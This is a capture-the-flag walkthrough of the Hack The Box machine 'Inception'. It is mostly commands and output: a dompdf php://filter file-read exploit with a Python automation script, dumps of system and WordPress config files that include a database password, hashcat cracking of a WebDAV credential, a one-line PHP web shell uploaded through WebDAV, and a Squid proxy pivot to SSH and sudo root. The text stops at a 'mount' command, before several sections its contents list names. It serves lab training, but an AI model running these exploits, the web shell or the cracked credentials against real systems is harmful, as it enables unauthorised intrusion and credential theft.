#### Inception

- [Attacker Info](#attacker-info)
- [Nmap Scan](#nmap-scan)
- [Web Enumeration](#web-enumeration)
- [Dompdf PHP Wrappers](#dompdf-php-wrappers)
- [Python program to automate](#python-program-to-automate)
- [WebDav](#webdav)
- [Pivot using Squid to listening locally](#pivot-using-squid-to-listening-locally)
- [Privilege Escalation](#privilege-escalation)
- [Getting nmap on Inception](#getting-nmap-on-inception)
- [FTP Anonymous Login](#ftp-anonymous-login)
- [Finding TFTP as a Running Service](#finding-tftp-as-a-running-service)
- [Using TFTP to grab crontab & creating a pre-invoke apt script](#using-tftp-to-grab-crontab-&-creating-a-pre-invoke-apt-script)

###### Attacker Info

```sh
root@kali:~/inception# ip addr
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
    link/ether 00:0c:29:b0:a9:19 brd ff:ff:ff:ff:ff:ff
    inet 192.168.150.18/24 brd 192.168.150.255 scope global dynamic noprefixroute eth0
       valid_lft 86038sec preferred_lft 86038sec
    inet6 fe80::20c:29ff:feb0:a919/64 scope link noprefixroute
       valid_lft forever preferred_lft forever
4: tun0: <POINTOPOINT,MULTICAST,NOARP> mtu 1500 qdisc pfifo_fast state DOWN group default qlen 100
    link/none
    inet 10.10.14.16/23 brd 10.10.15.255 scope global tun0
       valid_lft forever preferred_lft forever
6: tun1: <POINTOPOINT,MULTICAST,NOARP,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UNKNOWN group default qlen 100
    link/none
    inet 10.10.14.16/23 brd 10.10.15.255 scope global tun1
       valid_lft forever preferred_lft forever
    inet6 dead:beef:2::100e/64 scope global
       valid_lft forever preferred_lft forever
    inet6 fe80::5129:cd6c:977:5e0b/64 scope link stable-privacy
       valid_lft forever preferred_lft forever
root@kali:~/inception#
```

###### Nmap Scan

```sh
root@kali:~/inception# nmap -sC -sV -oA inception.nmap 10.10.10.67
Starting Nmap 7.70 ( https://nmap.org ) at 2018-06-25 17:17 EDT
Nmap scan report for 10.10.10.67
Host is up (0.19s latency).
Not shown: 998 filtered ports
PORT     STATE SERVICE     VERSION
80/tcp   open  http?
3128/tcp open  squid-http?

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 64.94 seconds
root@kali:~/inception#
```

###### Web Enumeration

```
http://10.10.10.67
http://10.10.10.67/dompdf
```

![](images/1.png)

![](images/2.png)

![](images/3.png)

![](images/4.png)

###### Dompdf PHP Wrappers

```sh
root@kali:~/inception# searchsploit dompdf
------------------------------------------------------------------------------- ----------------------------------------
 Exploit Title                                                                 |  Path
                                                                               | (/usr/share/exploitdb/)
------------------------------------------------------------------------------- ----------------------------------------
TYPO3 Extension ke DomPDF - Remote Code Execution                              | exploits/php/webapps/35443.txt
dompdf 0.6.0 - 'dompdf.php?read' Arbitrary File Read                           | exploits/php/webapps/33004.txt
dompdf 0.6.0 beta1 - Remote File Inclusion                                     | exploits/php/webapps/14851.txt
------------------------------------------------------------------------------- ----------------------------------------
Shellcodes: No Result
root@kali:~/inception#
```

```sh
root@kali:~/inception# searchsploit -x exploits/php/webapps/33004.txt
  Exploit: dompdf 0.6.0 - 'dompdf.php?read' Arbitrary File Read
      URL: https://www.exploit-db.com/exploits/33004/
     Path: /usr/share/exploitdb/exploits/php/webapps/33004.txt
File Type: ASCII text, with CRLF line terminators



root@kali:~/inception#
```

![](images/5.png)

```
http://10.10.10.67/dompdf/dompdf.php?input_file=php://filter/read=convert.base64-encode/resource=/etc/passwd
```

![](images/6.png)

![](images/7.png)

![](images/8.png)

```sh
root@kali:~/inception# echo cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb246eDoxOjE6ZGFlbW9uOi91c3Ivc2JpbjovdXNyL3NiaW4vbm9sb2dpbgpiaW46eDoyOjI6YmluOi9iaW46L3Vzci9zYmluL25vbG9naW4Kc3lzOng6MzozOnN5czovZGV2Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5bmM6eDo0OjY1NTM0OnN5bmM6L2JpbjovYmluL3N5bmMKZ2FtZXM6eDo1OjYwOmdhbWVzOi91c3IvZ2FtZXM6L3Vzci9zYmluL25vbG9naW4KbWFuOng6NjoxMjptYW46L3Zhci9jYWNoZS9tYW46L3Vzci9zYmluL25vbG9naW4KbHA6eDo3Ojc6bHA6L3Zhci9zcG9vbC9scGQ6L3Vzci9zYmluL25vbG9naW4KbWFpbDp4Ojg6ODptYWlsOi92YXIvbWFpbDovdXNyL3NiaW4vbm9sb2dpbgpuZXdzOng6OTo5Om5ld3M6L3Zhci9zcG9vbC9uZXdzOi91c3Ivc2Jpbi9ub2xvZ2luCnV1Y3A6eDoxMDoxMDp1dWNwOi92YXIvc3Bvb2wvdXVjcDovdXNyL3NiaW4vbm9sb2dpbgpwcm94eTp4OjEzOjEzOnByb3h5Oi9iaW46L3Vzci9zYmluL25vbG9naW4Kd3d3LWRhdGE6eDozMzozMzp3d3ctZGF0YTovdmFyL3d3dzovdXNyL3NiaW4vbm9sb2dpbgpiYWNrdXA6eDozNDozNDpiYWNrdXA6L3Zhci9iYWNrdXBzOi91c3Ivc2Jpbi9ub2xvZ2luCmxpc3Q6eDozODozODpNYWlsaW5nIExpc3QgTWFuYWdlcjovdmFyL2xpc3Q6L3Vzci9zYmluL25vbG9naW4KaXJjOng6Mzk6Mzk6aXJjZDovdmFyL3J1bi9pcmNkOi91c3Ivc2Jpbi9ub2xvZ2luCmduYXRzOng6NDE6NDE6R25hdHMgQnVnLVJlcG9ydGluZyBTeXN0ZW0gKGFkbWluKTovdmFyL2xpYi9nbmF0czovdXNyL3NiaW4vbm9sb2dpbgpub2JvZHk6eDo2NTUzNDo2NTUzNDpub2JvZHk6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5c3RlbWQtdGltZXN5bmM6eDoxMDA6MTAyOnN5c3RlbWQgVGltZSBTeW5jaHJvbml6YXRpb24sLCw6L3J1bi9zeXN0ZW1kOi9iaW4vZmFsc2UKc3lzdGVtZC1uZXR3b3JrOng6MTAxOjEwMzpzeXN0ZW1kIE5ldHdvcmsgTWFuYWdlbWVudCwsLDovcnVuL3N5c3RlbWQvbmV0aWY6L2Jpbi9mYWxzZQpzeXN0ZW1kLXJlc29sdmU6eDoxMDI6MTA0OnN5c3RlbWQgUmVzb2x2ZXIsLCw6L3J1bi9zeXN0ZW1kL3Jlc29sdmU6L2Jpbi9mYWxzZQpzeXN0ZW1kLWJ1cy1wcm94eTp4OjEwMzoxMDU6c3lzdGVtZCBCdXMgUHJveHksLCw6L3J1bi9zeXN0ZW1kOi9iaW4vZmFsc2UKc3lzbG9nOng6MTA0OjEwODo6L2hvbWUvc3lzbG9nOi9iaW4vZmFsc2UKX2FwdDp4OjEwNTo2NTUzNDo6L25vbmV4aXN0ZW50Oi9iaW4vZmFsc2UKc3NoZDp4OjEwNjo2NTUzNDo6L3Zhci9ydW4vc3NoZDovdXNyL3NiaW4vbm9sb2dpbgpjb2JiOng6MTAwMDoxMDAwOjovaG9tZS9jb2JiOi9iaW4vYmFzaAo= | base64 -d
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
sshd:x:106:65534::/var/run/sshd:/usr/sbin/nologin
cobb:x:1000:1000::/home/cobb:/bin/bash
root@kali:~/inception#
```

###### Python program to automate

`read-phpwrapper.py`

```python
import requests
from base64 import b64decode
import re

def GetFile(file):
	payload = { 'input_file':'php://filter/read=convert.base64-encode/resource='+file }
	resp = (requests.get('http://10.10.10.67/dompdf/dompdf.php', params=payload).text).strip()
	b64 = re.search("\[\((.*?)\)\]", resp).group(1)
	return b64decode(b64)

while True:
	cmd = input("> ")
	try:
		output = GetFile(cmd)
		print(output.decode())
	except:
		print("ERROR")
```

```sh
root@kali:~/inception# python3 read-phpwrapper.py
> /etc/shadow
ERROR
> /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
sshd:x:106:65534::/var/run/sshd:/usr/sbin/nologin
cobb:x:1000:1000::/home/cobb:/bin/bash

> /etc/hosts
127.0.0.1   localhost
127.0.1.1   Inception

# The following lines are desirable for IPv6 capable hosts
::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters

> /etc/apache2/apache2.conf
# This is the main Apache server configuration file.  It contains the
# configuration directives that give the server its instructions.
# See http://httpd.apache.org/docs/2.4/ for detailed information about
# the directives and /usr/share/doc/apache2/README.Debian about Debian specific
# hints.
#
#
# Summary of how the Apache 2 configuration works in Debian:
# The Apache 2 web server configuration in Debian is quite different to
# upstream's suggested way to configure the web server. This is because Debian's
# default Apache2 installation attempts to make adding and removing modules,
# virtual hosts, and extra configuration directives as flexible as possible, in
# order to make automating the changes and administering the server as easy as
# possible.

# It is split into several files forming the configuration hierarchy outlined
# below, all located in the /etc/apache2/ directory:
#
#	/etc/apache2/
#	|-- apache2.conf
#	|	`--  ports.conf
#	|-- mods-enabled
#	|	|-- *.load
#	|	`-- *.conf
#	|-- conf-enabled
#	|	`-- *.conf
# 	`-- sites-enabled
#	 	`-- *.conf
#
#
# * apache2.conf is the main configuration file (this file). It puts the pieces
#   together by including all remaining configuration files when starting up the
#   web server.
#
# * ports.conf is always included from the main configuration file. It is
#   supposed to determine listening ports for incoming connections which can be
#   customized anytime.
#
# * Configuration files in the mods-enabled/, conf-enabled/ and sites-enabled/
#   directories contain particular configuration snippets which manage modules,
#   global configuration fragments, or virtual host configurations,
#   respectively.
#
#   They are activated by symlinking available configuration files from their
#   respective *-available/ counterparts. These should be managed by using our
#   helpers a2enmod/a2dismod, a2ensite/a2dissite and a2enconf/a2disconf. See
#   their respective man pages for detailed information.
#
# * The binary is called apache2. Due to the use of environment variables, in
#   the default configuration, apache2 needs to be started/stopped with
#   /etc/init.d/apache2 or apache2ctl. Calling /usr/bin/apache2 directly will not
#   work with the default configuration.


# Global configuration
#

#
# ServerRoot: The top of the directory tree under which the server's
# configuration, error, and log files are kept.
#
# NOTE!  If you intend to place this on an NFS (or otherwise network)
# mounted filesystem then please read the Mutex documentation (available
# at <URL:http://httpd.apache.org/docs/2.4/mod/core.html#mutex>);
# you will save yourself a lot of trouble.
#
# Do NOT add a slash at the end of the directory path.
#
#ServerRoot "/etc/apache2"

#
# The accept serialization lock file MUST BE STORED ON A LOCAL DISK.
#
Mutex file:${APACHE_LOCK_DIR} default

#
# PidFile: The file in which the server should record its process
# identification number when it starts.
# This needs to be set in /etc/apache2/envvars
#
PidFile ${APACHE_PID_FILE}

#
# Timeout: The number of seconds before receives and sends time out.
#
Timeout 300

#
# KeepAlive: Whether or not to allow persistent connections (more than
# one request per connection). Set to "Off" to deactivate.
#
KeepAlive On

#
# MaxKeepAliveRequests: The maximum number of requests to allow
# during a persistent connection. Set to 0 to allow an unlimited amount.
# We recommend you leave this number high, for maximum performance.
#
MaxKeepAliveRequests 100

#
# KeepAliveTimeout: Number of seconds to wait for the next request from the
# same client on the same connection.
#
KeepAliveTimeout 5


# These need to be set in /etc/apache2/envvars
User ${APACHE_RUN_USER}
Group ${APACHE_RUN_GROUP}

#
# HostnameLookups: Log the names of clients or just their IP addresses
# e.g., www.apache.org (on) or 204.62.129.132 (off).
# The default is off because it'd be overall better for the net if people
# had to knowingly turn this feature on, since enabling it means that
# each client request will result in AT LEAST one lookup request to the
# nameserver.
#
HostnameLookups Off

# ErrorLog: The location of the error log file.
# If you do not specify an ErrorLog directive within a <VirtualHost>
# container, error messages relating to that virtual host will be
# logged here.  If you *do* define an error logfile for a <VirtualHost>
# container, that host's errors will be logged there and not here.
#
ErrorLog ${APACHE_LOG_DIR}/error.log

#
# LogLevel: Control the severity of messages logged to the error_log.
# Available values: trace8, ..., trace1, debug, info, notice, warn,
# error, crit, alert, emerg.
# It is also possible to configure the log level for particular modules, e.g.
# "LogLevel info ssl:warn"
#
LogLevel warn

# Include module configuration:
IncludeOptional mods-enabled/*.load
IncludeOptional mods-enabled/*.conf

# Include list of ports to listen on
Include ports.conf


# Sets the default security model of the Apache2 HTTPD server. It does
# not allow access to the root filesystem outside of /usr/share and /var/www.
# The former is used by web applications packaged in Debian,
# the latter may be used for local directories served by the web server. If
# your system is serving content from a sub-directory in /srv you must allow
# access here, or in any related virtual host.
<Directory />
	Options FollowSymLinks
	AllowOverride None
	Require all denied
</Directory>

<Directory /usr/share>
	AllowOverride None
	Require all granted
</Directory>

<Directory /var/www/>
	Options Indexes FollowSymLinks
	AllowOverride None
	Require all granted
</Directory>

#<Directory /srv/>
#	Options Indexes FollowSymLinks
#	AllowOverride None
#	Require all granted
#</Directory>




# AccessFileName: The name of the file to look for in each directory
# for additional configuration directives.  See also the AllowOverride
# directive.
#
AccessFileName .htaccess

#
# The following lines prevent .htaccess and .htpasswd files from being
# viewed by Web clients.
#
<FilesMatch "^\.ht">
	Require all denied
</FilesMatch>


#
# The following directives define some format nicknames for use with
# a CustomLog directive.
#
# These deviate from the Common Log Format definitions in that they use %O
# (the actual bytes sent including headers) instead of %b (the size of the
# requested file), because the latter makes it impossible to detect partial
# requests.
#
# Note that the use of %{X-Forwarded-For}i instead of %h is not recommended.
# Use mod_remoteip instead.
#
LogFormat "%v:%p %h %l %u %t \"%r\" %>s %O \"%{Referer}i\" \"%{User-Agent}i\"" vhost_combined
LogFormat "%h %l %u %t \"%r\" %>s %O \"%{Referer}i\" \"%{User-Agent}i\"" combined
LogFormat "%h %l %u %t \"%r\" %>s %O" common
LogFormat "%{Referer}i -> %U" referer
LogFormat "%{User-agent}i" agent

# Include of directories ignores editors' and dpkg's backup files,
# see README.Debian for details.

# Include generic snippets of statements
IncludeOptional conf-enabled/*.conf

# Include the virtual host configurations:
IncludeOptional sites-enabled/*.conf

# vim: syntax=apache ts=4 sw=4 sts=4 sr noet

> /etc/apache2/sites-enabled/000-default.conf
<VirtualHost *:80>
	# The ServerName directive sets the request scheme, hostname and port that
	# the server uses to identify itself. This is used when creating
	# redirection URLs. In the context of virtual hosts, the ServerName
	# specifies what hostname must appear in the request's Host: header to
	# match this virtual host. For the default virtual host (this file) this
	# value is not decisive as it is used as a last resort host regardless.
	# However, you must set it for any further virtual host explicitly.
	#ServerName www.example.com

	ServerAdmin webmaster@localhost
	DocumentRoot /var/www/html

	# Available loglevels: trace8, ..., trace1, debug, info, notice, warn,
	# error, crit, alert, emerg.
	# It is also possible to configure the loglevel for particular
	# modules, e.g.
	#LogLevel info ssl:warn

	ErrorLog ${APACHE_LOG_DIR}/error.log
	CustomLog ${APACHE_LOG_DIR}/access.log combined

	# For most configuration files from conf-available/, which are
	# enabled or disabled at a global level, it is possible to
	# include a line for only one particular virtual host. For example the
	# following line enables the CGI configuration for this host only
	# after it has been globally disabled with "a2disconf".
	#Include conf-available/serve-cgi-bin.conf
	Alias /webdav_test_inception /var/www/html/webdav_test_inception
	<Location /webdav_test_inception>
		Options FollowSymLinks
		DAV On
		AuthType Basic
		AuthName "webdav test credential"
		AuthUserFile /var/www/html/webdav_test_inception/webdav.passwd
		Require valid-user
	</Location>
</VirtualHost>

# vim: syntax=apache ts=4 sw=4 sts=4 sr noet

> /var/www/html/webdav_test_inception/webdav.passwd
webdav_tester:$apr1$8rO7Smi4$yqn7H.GvJFtsTou1a7VME0

> /var/www/html/wordpress_4.8.3/wp-config.php
<?php
/**
 * The base configuration for WordPress
 *
 * The wp-config.php creation script uses this file during the
 * installation. You don't have to use the web site, you can
 * copy this file to "wp-config.php" and fill in the values.
 *
 * This file contains the following configurations:
 *
 * * MySQL settings
 * * Secret keys
 * * Database table prefix
 * * ABSPATH
 *
 * @link https://codex.wordpress.org/Editing_wp-config.php
 *
 * @package WordPress
 */

// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define('DB_NAME', 'wordpress');

/** MySQL database username */
define('DB_USER', 'root');

/** MySQL database password */
define('DB_PASSWORD', 'VwPddNh7xMZyDQoByQL4');

/** MySQL hostname */
define('DB_HOST', 'localhost');

/** Database Charset to use in creating database tables. */
define('DB_CHARSET', 'utf8');

/** The Database Collate type. Don't change this if in doubt. */
define('DB_COLLATE', '');

/**#@+
 * Authentication Unique Keys and Salts.
 *
 * Change these to different unique phrases!
 * You can generate these using the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}
 * You can change these at any point in time to invalidate all existing cookies. This will force all users to have to log in again.
 *
 * @since 2.6.0
 */
define('AUTH_KEY',         'put your unique phrase here');
define('SECURE_AUTH_KEY',  'put your unique phrase here');
define('LOGGED_IN_KEY',    'put your unique phrase here');
define('NONCE_KEY',        'put your unique phrase here');
define('AUTH_SALT',        'put your unique phrase here');
define('SECURE_AUTH_SALT', 'put your unique phrase here');
define('LOGGED_IN_SALT',   'put your unique phrase here');
define('NONCE_SALT',       'put your unique phrase here');

/**#@-*/

/**
 * WordPress Database Table prefix.
 *
 * You can have multiple installations in one database if you give each
 * a unique prefix. Only numbers, letters, and underscores please!
 */
$table_prefix  = 'wp_';

/**
 * For developers: WordPress debugging mode.
 *
 * Change this to true to enable the display of notices during development.
 * It is strongly recommended that plugin and theme developers use WP_DEBUG
 * in their development environments.
 *
 * For information on other constants that can be used for debugging,
 * visit the Codex.
 *
 * @link https://codex.wordpress.org/Debugging_in_WordPress
 */
define('WP_DEBUG', false);

/* That's all, stop editing! Happy blogging. */

/** Absolute path to the WordPress directory. */
if ( !defined('ABSPATH') )
	define('ABSPATH', dirname(__FILE__) . '/');

/** Sets up WordPress vars and included files. */
require_once(ABSPATH . 'wp-settings.php');

>
```

[`Hashcat - Example Hashes`](https://hashcat.net/wiki/doku.php?id=example_hashes)

![](images/9.png)

```sh
root@kali:~/inception# hashcat -m 1600 '$apr1$8rO7Smi4$yqn7H.GvJFtsTou1a7VME0' /usr/share/wordlists/rockyou.txt --force
hashcat (v4.1.0) starting...

OpenCL Platform #1: The pocl project
====================================
* Device #1: pthread-Intel(R) Core(TM) i5-6360U CPU @ 2.00GHz, 512/1493 MB allocatable, 4MCU

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Applicable optimizers:
* Zero-Byte
* Single-Hash
* Single-Salt

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

ATTENTION! Pure (unoptimized) OpenCL kernels selected.
This enables cracking passwords and salts > length 32 but for the price of drastically reduced performance.
If you want to switch to optimized OpenCL kernels, append -O to your commandline.

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

* Device #1: build_opts '-cl-std=CL1.2 -I OpenCL -I /usr/share/hashcat/OpenCL -D VENDOR_ID=64 -D CUDA_ARCH=0 -D AMD_ROCM=0 -D VECT_SIZE=8 -D DEVICE_TYPE=2 -D DGST_R0=0 -D DGST_R1=1 -D DGST_R2=2 -D DGST_R3=3 -D DGST_ELEM=4 -D KERN_TYPE=1600 -D _unroll'
* Device #1: Kernel m01600.09ebcd5b.kernel not found in cache! Building may take a while...
* Device #1: Kernel amp_a0.1e09e080.kernel not found in cache! Building may take a while...
Dictionary cache built:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344391
* Bytes.....: 139921497
* Keyspace..: 14344384
* Runtime...: 4 secs

$apr1$8rO7Smi4$yqn7H.GvJFtsTou1a7VME0:babygurl69

Session..........: hashcat
Status...........: Cracked
Hash.Type........: Apache $apr1$ MD5, md5apr1, MD5 (APR)
Hash.Target......: $apr1$8rO7Smi4$yqn7H.GvJFtsTou1a7VME0
Time.Started.....: Mon Jun 25 19:26:58 2018 (4 secs)
Time.Estimated...: Mon Jun 25 19:27:02 2018 (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.Dev.#1.....:     5668 H/s (5.13ms) @ Accel:128 Loops:62 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts
Progress.........: 22528/14344384 (0.16%)
Rejected.........: 0/22528 (0.00%)
Restore.Point....: 22016/14344384 (0.15%)
Candidates.#1....: fabrice -> travon
HWMon.Dev.#1.....: N/A

Started: Mon Jun 25 19:26:35 2018
Stopped: Mon Jun 25 19:27:03 2018
root@kali:~/inception#
```

```
http://10.10.10.67/webdav_test_inception
```

```
webdav_tester
babygurl69
```

![](images/10.png)

![](images/11.png)

###### WebDav

`shell.php`

```php
<?php echo system($_REQUEST['cmd']); ?>
```

```sh
root@kali:~/inception# curl -vvv --upload-file shell.php http://10.10.10.67/webdav_test_inception/shell.php --user webdav_tester:babygurl69
*   Trying 10.10.10.67...
* TCP_NODELAY set
* Connected to 10.10.10.67 (10.10.10.67) port 80 (#0)
* Server auth using Basic with user 'webdav_tester'
> PUT /webdav_test_inception/shell.php HTTP/1.1
> Host: 10.10.10.67
> Authorization: Basic d2ViZGF2X3Rlc3RlcjpiYWJ5Z3VybDY5
> User-Agent: curl/7.60.0
> Accept: */*
> Content-Length: 40
> Expect: 100-continue
>
< HTTP/1.1 100 Continue
* We are completely uploaded and fine
< HTTP/1.1 201 Created
< Date: Mon, 25 Jun 2018 23:35:46 GMT
< Server: Apache/2.4.18 (Ubuntu)
< Location: http://10.10.10.67/webdav_test_inception/shell.php
< Content-Length: 283
< Content-Type: text/html; charset=ISO-8859-1
<
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>201 Created</title>
</head><body>
<h1>Created</h1>
<p>Resource /webdav_test_inception/shell.php has been created.</p>
<hr />
<address>Apache/2.4.18 (Ubuntu) Server at 10.10.10.67 Port 80</address>
</body></html>
* Connection #0 to host 10.10.10.67 left intact
root@kali:~/inception#
```

```
http://10.10.10.67/webdav_test_inception/shell.php
http://10.10.10.67/webdav_test_inception/shell.php?cmd=id
```

![](images/12.png)

###### Pivot using Squid to listening locally

![](images/13.png)

```sh
root@kali:~/inception# vim /etc/proxychains.conf
```

![](images/14.png)

```sh
root@kali:~/inception# proxychains nmap -sT -p 22 -n 10.10.10.67
ProxyChains-3.1 (http://proxychains.sf.net)
Starting Nmap 7.70 ( https://nmap.org ) at 2018-06-25 20:15 EDT
|S-chain|-<>-10.10.10.67:3128-<><>-10.10.10.67:22-<--denied
Nmap scan report for 10.10.10.67
Host is up (0.33s latency).

PORT   STATE  SERVICE
22/tcp closed ssh

Nmap done: 1 IP address (1 host up) scanned in 0.98 seconds
root@kali:~/inception#
```

```sh
root@kali:~/inception# proxychains nmap -sT -p 22 -n 127.0.0.1
ProxyChains-3.1 (http://proxychains.sf.net)
Starting Nmap 7.70 ( https://nmap.org ) at 2018-06-25 20:15 EDT
|S-chain|-<>-10.10.10.67:3128-<><>-127.0.0.1:22-<><>-OK
Nmap scan report for 127.0.0.1
Host is up (0.43s latency).

PORT   STATE SERVICE
22/tcp open  ssh

Nmap done: 1 IP address (1 host up) scanned in 0.47 seconds
root@kali:~/inception#
```

```
cobb
VwPddNh7xMZyDQoByQL4
```

```sh
root@kali:~/inception# proxychains ssh cobb@127.0.0.1
ProxyChains-3.1 (http://proxychains.sf.net)
|S-chain|-<>-10.10.10.67:3128-<><>-127.0.0.1:22-<><>-OK
The authenticity of host '127.0.0.1 (127.0.0.1)' can't be established.
ECDSA key fingerprint is SHA256:dr5DOURssJH5i8VbjPxvbeM+e2FyMqJ8DGPB/Lcv1Mw.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '127.0.0.1' (ECDSA) to the list of known hosts.
cobb@127.0.0.1's password:
Welcome to Ubuntu 16.04.3 LTS (GNU/Linux 4.4.0-101-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage
Last login: Thu Nov 30 20:06:16 2017 from 127.0.0.1
cobb@Inception:~$ id
uid=1000(cobb) gid=1000(cobb) groups=1000(cobb),27(sudo)
cobb@Inception:~$ ls -lah
total 36K
drwxr-xr-x 3 cobb cobb 4.0K Nov 30  2017 .
drwxr-xr-x 3 root root 4.0K Nov  6  2017 ..
-rw------- 1 root root 1.3K Nov 30  2017 .bash_history
-rw-r--r-- 1 cobb cobb  220 Aug 31  2015 .bash_logout
-rw-r--r-- 1 cobb cobb 3.7K Aug 31  2015 .bashrc
drwx------ 2 cobb cobb 4.0K Nov  6  2017 .cache
-rw-r--r-- 1 cobb cobb  655 May 16  2017 .profile
-rw-r--r-- 1 cobb cobb    0 Nov  6  2017 .sudo_as_admin_successful
-r-------- 1 cobb cobb   33 Nov  6  2017 user.txt
-rw------- 1 cobb cobb 3.6K Nov 30  2017 .viminfo
cobb@Inception:~$ cat user.txt
4a8bc2d686d093f3f8ad1b37b191303c
cobb@Inception:~$
```

###### Privilege Escalation

```sh
cobb@Inception:~$ sudo -l
[sudo] password for cobb:
Matching Defaults entries for cobb on Inception:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User cobb may run the following commands on Inception:
    (ALL : ALL) ALL
cobb@Inception:~$ 
```

```sh
cobb@Inception:/tmp$ sudo su -
[sudo] password for cobb:
root@Inception:~# cd /root
root@Inception:~# cat root.txt
You're waiting for a train. A train that will take you far away. Wake up to find root.txt.
root@Inception:~#
```

```sh
cobb@Inception:~$ ifconfig
eth0      Link encap:Ethernet  HWaddr 00:16:3e:28:53:63
          inet addr:192.168.0.10  Bcast:192.168.0.255  Mask:255.255.255.0
          inet6 addr: fe80::216:3eff:fe28:5363/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:1464 errors:0 dropped:0 overruns:0 frame:0
          TX packets:1064 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000
          RX bytes:144540 (144.5 KB)  TX bytes:1168113 (1.1 MB)

lo        Link encap:Local Loopback
          inet addr:127.0.0.1  Mask:255.0.0.0
          inet6 addr: ::1/128 Scope:Host
          UP LOOPBACK RUNNING  MTU:65536  Metric:1
          RX packets:4269 errors:0 dropped:0 overruns:0 frame:0
          TX packets:4269 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1
          RX bytes:239227 (239.2 KB)  TX bytes:239227 (239.2 KB)

cobb@Inception:~$
```

```sh
cobb@Inception:~$ mount
